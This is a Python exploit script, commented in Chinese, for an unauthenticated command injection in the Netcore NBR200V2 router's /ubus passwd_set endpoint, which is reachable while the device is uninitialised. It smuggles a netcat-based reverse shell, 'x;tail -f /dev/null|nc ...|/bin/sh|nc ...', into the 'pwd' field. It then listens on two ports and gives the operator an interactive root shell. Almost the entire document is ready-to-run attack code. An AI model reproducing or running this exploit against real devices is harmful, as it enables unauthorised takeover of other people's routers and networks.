#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EXP: Netcore NBR200V2 V1.3.241127 未授权(pre-init)命令注入 —— /ubus routerd.passwd_set pwd 参数
# 污点: pwd -> system("uci set auto_ac.auto_ac.passwd=%s;uci commit auto_ac")
# 利用条件: 设备处于出厂/未初始化状态(rpcd unauthenticated.json 生效, passwd_set 未授权可达), 无需任何凭证
# 双通道反弹(固件 busybox nc 无 -e): lport=命令输入通道, lport+1=回显输出通道
# 用法: python exp_netcore_nbr200_passwd_set_rce.py <target_ip> [target_port=80] [lhost] [lport=4444]
#   例(模拟环境): python exp_netcore_nbr200_passwd_set_rce.py 192.168.2.234 8080 192.168.2.128 4444

import socket
import sys
import threading
import time
import http.client
import json

def main():
    if len(sys.argv) < 2:
        print("Usage: python %s <target_ip> [target_port=80] [lhost] [lport=4444]" % sys.argv[0])
        sys.exit(1)
    target = sys.argv[1]
    tport = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    lhost = sys.argv[3] if len(sys.argv) > 3 else "0.0.0.0"
    lport = int(sys.argv[4]) if len(sys.argv) > 4 else 4444

    rhost = lhost
    if rhost == "0.0.0.0":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, tport))
            rhost = s.getsockname()[0]
        finally:
            s.close()
    print("[*] target = %s:%d  reverse to = %s:%d(cmd)/%d(out)" % (target, tport, rhost, lport, lport + 1))

    cmd_srv = socket.socket(); cmd_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    cmd_srv.bind(("0.0.0.0", lport)); cmd_srv.listen(1); cmd_srv.settimeout(30)
    out_srv = socket.socket(); out_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    out_srv.bind(("0.0.0.0", lport + 1)); out_srv.listen(1); out_srv.settimeout(30)

    # 注入: pwd 拼入 system("uci set auto_ac.auto_ac.passwd=%s;uci commit auto_ac")
    # 模板自带尾部分号, pwd 末尾不要再加 ';' (防 ';;' 语法错误)
    inject = "x;tail -f /dev/null|nc %s %d|/bin/sh|nc %s %d" % (rhost, lport, rhost, lport + 1)
    body = json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "call",
        "params": ["00000000000000000000000000000000", "routerd", "passwd_set",
                   {"user": "root", "pwd": inject, "by": "web"}]
    })

    def fire():
        try:
            conn = http.client.HTTPConnection(target, tport, timeout=10)
            conn.request("POST", "/ubus", body=body, headers={"Content-Type": "application/json"})
            print("[*] ubus response: %s" % conn.getresponse().read().decode(errors="replace")[:200])
        except Exception as e:
            print("[!] http error (may be harmless): %s" % e)

    threading.Thread(target=fire, daemon=True).start()
    print("[*] exploit sent, waiting for reverse connections ...")

    try:
        cmd_conn, ca = cmd_srv.accept()
        print("[+] cmd channel connected from %s:%d" % ca)
        out_conn, oa = out_srv.accept()
        print("[+] output channel connected from %s:%d" % oa)
    except socket.timeout:
        print("[-] reverse connection timeout (30s). 检查: 设备是否 pre-init 状态/端口/防火墙/lhost")
        sys.exit(2)

    out_conn.settimeout(1.0)
    cmd_conn.sendall(b"exec 2>&1\n")
    time.sleep(0.3)
    cmd_conn.sendall(b"id && echo SHELL_OK && pwd\n")

    def reader():
        buf = b""
        while True:
            try:
                data = out_conn.recv(4096)
                if not data:
                    sys.stdout.write("\n[-] output channel closed\n"); sys.stdout.flush(); return
                buf += data
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    sys.stdout.write(line.decode(errors="replace") + "\n"); sys.stdout.flush()
            except socket.timeout:
                continue
            except OSError:
                return

    threading.Thread(target=reader, daemon=True).start()
    time.sleep(1.0)
    print("[*] interactive shell (exit/quit 退出):")

    while True:
        try:
            line = input("")
        except (EOFError, KeyboardInterrupt):
            break
        if line.strip() in ("exit", "quit"):
            break
        try:
            cmd_conn.sendall(line.encode() + b"\n")
        except OSError:
            print("[-] cmd channel broken"); break
        time.sleep(0.2)

    try:
        cmd_conn.sendall(b"exit\n"); time.sleep(0.3)
    except OSError:
        pass
    for x in (cmd_conn, out_conn, cmd_srv, out_srv):
        try: x.close()
        except Exception: pass
    print("[*] done")

if __name__ == "__main__":
    main()
